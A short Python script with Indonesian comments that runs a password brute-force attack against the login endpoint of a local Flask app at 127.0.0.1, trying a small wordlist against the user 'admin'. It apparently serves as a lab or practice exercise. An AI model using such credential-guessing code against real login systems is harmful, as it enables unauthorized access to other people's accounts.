import requests

# URL dan target user
url = "http://127.0.0.1:5000/login"  # Endpoint login
username = "admin"  # Target username
passwords = ["anggi", "password", "admin123", "qwerty", "dwfua262662"]  # Daftar password yang akan diuji

print("[*] Starting brute force attack...")  # Perbaikan penggunaan print
for password in passwords:
    try:
        # Kirim request POST ke server Flask
        response = requests.post(url, data={"username": username, "password": password})

        if "Welcome" in response.text:  # Cek apakah respons berisi kata "Welcome"
            print(f"[+] Password ditemukan: {password}")
            break
        else:
            print(f"[-] Gagal mencoba password: {password}")
    except requests.ConnectionError:
        print("[!] Tidak dapat terhubung ke server. Pastikan Flask berjalan.")
        break
else:
    print("[!] Password tidak ada yang cocok.")
